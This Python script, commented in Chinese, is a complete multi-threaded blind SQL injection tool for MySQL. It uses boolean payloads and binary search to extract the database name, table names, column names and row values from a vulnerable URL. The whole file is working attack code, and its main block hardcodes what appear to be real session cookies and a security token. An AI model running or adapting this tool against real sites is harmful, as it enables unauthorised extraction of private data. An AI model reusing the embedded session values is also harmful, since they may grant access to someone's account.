#sql注入 盲注脚本框架——含多线程
import optparse
import requests
import threading
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

DBTables = []
column_names = []
datavalue = []

class SchemaName():  # 爆数据库名

    def __init__(self, url, true_str, cookie_dist):
        self.url = url
        self.cookie = cookie_dist
        self.true_str = true_str
        self.cookie = cookie_dist


    def length_schema(self):  # 猜解数据库名的长度
        for i in range(1,99):
            payload = "' and if(length(database()) = {0},1,0) %23"
            url = self.url + payload
            res = requests.get(url = url.format(i), cookies=self.cookie, verify=False)
            if self.true_str in res.text:
                print("\033[0;32m%s\033[0m" % '[+]schema_length is :' + str(i))
                schema_name_length = int(i)
                return schema_name_length


    def schema_name(self,length):
        database_name = ''
        payload = "' and if(ascii(substr(database(),{0},1)) > {1},1,0) %23"
        url = self.url + payload
        for a in range(1, length + 1):
            left = 0
            right = 127
            mid = int((left + right) / 2)
            while (left < right):  # 二分查找
                res = requests.get(url = url.format(a,mid), cookies=self.cookie, verify=False)
                if self.true_str in res.text:
                    left = mid + 1
                else:
                    right = mid
                mid = int((left + right) / 2)
            database_name += chr(mid)
            print("[-]" + database_name)
        return database_name


    def main(self):
        length = self.length_schema()
        schema_name = self.schema_name(length)
        print("\033[0;34m%s\033[0m" % "[+]数据库名：" + str(schema_name))
        return str(schema_name)



class TableName():  # 爆表名
    def __init__(self, url, schema_name, true_str, cookie_dist):
        self.url = url
        self.schema_name = schema_name
        self.table_names = []
        self.true_str = true_str
        self.cookie = cookie_dist


    def table_number(self):
        payload = "' and if((select count(*) from information_schema.tables where table_schema = '{0}') = {1}, 1, 0) %23"
        url = self.url + payload
        for DBTableCount in range(1, 99):
            res = requests.get(url.format(self.schema_name, DBTableCount))
            if self.true_str in res.content.decode("utf-8"):
                print("[+]{0}数据库中表的数量为:{1}".format(self.schema_name, DBTableCount))
                self.table_numbers = DBTableCount
                return self.table_numbers


    def table_name(self, x):
        x = x
        #获取表长度
        tablelens = 0
        for tablelen in range(1,99):
            payload = "' and if((select LENGTH(table_name) from information_schema.tables where table_schema = '{0}' limit {1}, 1) = {2}, 1, 0) %23"
            url = self.url + payload
            res = requests.get(url.format(self.schema_name,x, tablelen))
            if self.true_str in res.content.decode("utf-8"):
                print("\033[0;32m%s\033[0m" % "[-]tableLen",x,":",tablelen)
                tablelens = tablelen
                break

        tablename = ''
        for y in range(1, tablelens+1):
            payload = "' and if(ascii(substr((select table_name from information_schema.tables where table_schema= '{0}' limit {1},1),{2},1)) > {3},1,0) %23"
            url = self.url + payload
            left = 0
            right = 127
            mid = int((left + right) / 2)
            while (left < right):
                res = requests.get(url=url.format(self.schema_name, x, y, mid), cookies=self.cookie, verify=False)  # 改请求方式
                if self.true_str in res.text:
                    left = mid + 1
                else:
                    right = mid
                mid = int((left + right) / 2)
            tablename += chr(mid)
            print("[-]" + tablename)
        self.table_names.append(tablename)
        print("\033[0;34m%s\033[0m" % '[+]One Of Tables is:' + tablename)
        DBTables.append(tablename)


    def main(self):
        threads = []
        self.table_number()
        for i in range(0, self.table_numbers):
            t = threading.Thread(target=self.table_name, args=(i,))
            threads.append(t)
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        print(DBTables)
        return DBTables



class ColumnName():
    def __init__(self, url, schem_name, table_name, true_str, cookie_dist):
        self.url = url
        self.schema_name = schem_name
        self.table_name = table_name
        self.true_str = true_str
        self.cookie = cookie_dist


    def column_number(self):

        for DBColumnCount in range(1, 99):
            payload = "' and if((select count(*) from information_schema.columns where table_schema = '{0}' and table_name = '{1}') = {2}, 1, 0) %23"
            url = self.url + payload
            res = requests.get(url.format(self.schema_name, self.table_name, DBColumnCount))
            if self.true_str in res.content.decode("utf-8"):
                print("[+]{0}数据表的字段数为:{1}".format(self.table_name,DBColumnCount))
                self.co_numbers = DBColumnCount
                return self.co_numbers


    def column_name(self, x):
        x = x
        columnlens = 0
        for columnlen in range(1,99):
            # 获取字段长度
            payload = "' and if((select length(column_name) from information_schema.columns where table_schema = '{0}' and table_name = '{1}' limit {2}, 1) = {3}, 1, 0) %23"
            url = self.url + payload
            res = requests.get(url.format(self.schema_name, self.table_name, x, columnlen))
            if self.true_str in res.content.decode("utf-8"):
                print("\033[0;32m%s\033[0m" % "[+]columnlen",x,":",columnlen)
                columnlens = columnlen
                break

        columnname = ''
        for y in range(1, columnlens+1):
            payload = "' and if(ascii(substr((select column_name from information_schema.columns where table_schema = '{0}' and table_name = '{1}' limit {2}, 1), {3}, 1)) > {4}, 1, 0) %23"
            url = self.url + payload
            left = 0
            right = 127
            mid = int((left + right) / 2)
            while (left < right):
                res = requests.get(url=url.format(self.schema_name, self.table_name, x, y, mid), cookies=self.cookie, verify=False)  # 改请求方式
                if self.true_str in res.text:
                    left = mid + 1
                else:
                    right = mid
                mid = int((left + right) / 2)
            columnname += chr(mid)
            print("[-]" + columnname)
        column_names.append(columnname)
        print("\033[0;34m%s\033[0m" % '[+]One Of Columnname is:' + columnname)


    def main(self):
        threads = []
        self.column_number()
        for i in range(0, self.co_numbers):
            t = threading.Thread(target=self.column_name, args=(i,))
            threads.append(t)
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        return column_names



class DateValue():

    def __init__(self, url, schem_name, table_name, column_name, true_str, cookie_dist):
        self.url = url
        self.schema_name = schem_name
        self.table_name = table_name
        self.column_name = column_name
        self.true_str = true_str
        self.column_values = []
        self.datavalue = []
        self.cookie = cookie_dist


    def DataValue_number(self):
        for DBDataCount in range(99):
            payload = "'and if ((select count({0}) from {1})={2},1,0) %23"
            url = self.url + payload
            res = requests.get(url=url.format(self.column_name, self.table_name, DBDataCount), cookies=self.cookie, verify=False)
            if self.true_str in res.text:
                print("\033[0;32m%s\033[0m" % "[+]{0}表{1}字段的数据数量为:{2}".format(self.table_name, self.column_name, DBDataCount))
                self.data_num = DBDataCount
                return self.data_num


    def DataValue_value(self,x):
        x = x
        #获取字段长度
        datalens = 0
        for datalen in range(1,99):
            payload = "'and if ((select length({0}) from {1} limit {2},1) = {3},1,0) %23"
            url = self.url + payload
            res = requests.get(url.format(self.column_name,self.table_name, x, datalen), cookies=self.cookie, verify=False)
            if self.true_str in res.content.decode("utf-8"):
                print("\033[0;32m%s\033[0m" % "[+]Columnlen:",datalen)
                datalens = datalen
                break

        datavalue = ''
        for y in range(1, datalens+1):
            payload = "'and if (ascii(substr((select {0} from {1} limit {2},1),{3},1)) > {4},1,0) %23"
            url = self.url + payload
            left = 0
            right = 127
            mid = int((left + right) / 2)
            while (left < right):
                res = requests.get(url=url.format(self.column_name, self.table_name, x, y, mid), cookies=self.cookie, verify=False)  # 改请求方式
                if self.true_str in res.text:
                    left = mid + 1
                else:
                    right = mid
                mid = int((left + right) / 2)
            datavalue += chr(mid)
            print("[-]" + datavalue)
        self.datavalue.append(datavalue)
        print("\033[0;34m%s\033[0m" % '[+]One Of Datavalue is:' + datavalue)
        self.datavalue.append(datavalue)


    def main(self):
        threads = []
        self.DataValue_number()
        for i in range(0, self.data_num):
            t = threading.Thread(target=self.DataValue_value, args=(i,))
            threads.append(t)
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        return self.datavalue



def StartSqli(url, true_str, cookie):

    schema = SchemaName(url, true_str, cookie)
    schema_name = schema.main()

    table = TableName(url, schema_name, true_str, cookie)
    table_list = table.main()

    print("\033[0;31m%s\033[0m" % "[+]数据库{0}的表如下:".format(schema_name))
    for item in range(len(DBTables)):
        print("(" + str(item + 1) + ")" + DBTables[item])
    tableIndex = int(input("\033[0;35m%s\033[0m" % "[*]请输入要查看的表的序号:")) - 1
    column = ColumnName(url, schema_name, DBTables[tableIndex], true_str, cookie)
    column_list = column.main()

    while True:
        print("\033[0;31m%s\033[0m" % "[+]数据表{0}的字段如下:".format(DBTables[tableIndex]))
        for item in range(len(column_names)):
            print("(" + str(item + 1) + ")" + column_names[item])
        columnIndex = int(input("\033[0;35m%s\033[0m" % "[*]请输入要查看的字段的序号(输入0退出):")) - 1
        if (columnIndex == -1):
            break
        else:
            value = DateValue(url, schema_name, DBTables[tableIndex], column_names[columnIndex], true_str, cookie)
            value_list = value.main()


if __name__ == '__main__':
    cookie = {'EAD_JSESSIONID': '1216591E8D9C5094F2881B640DC2DD4A', 'account': 'anquan_saomiao', 'status': '1',
              '_security': 'b6180d3a2e298f5a6082d55035f2d43a'}

    #eg: python sql_injection.py -u "http://127.0.0.1/?id=1" -f "Hello"
    parser = optparse.OptionParser('usage: python %prog -u url \n\n' 'Example: python %prog -u http://127.0.0.1?id=1\n')
    parser.add_option('-u', '--url', dest= 'targetURL',default='http://127.0.0.1?id=1', type='string',help='Enter SQL injection URL')
    parser.add_option('-f', '--flags', dest= 'targetflag', default='Happy', type='string',help='Enter Flag')
    (options, args) = parser.parse_args()
    StartSqli(options.targetURL,options.targetflag,cookie)
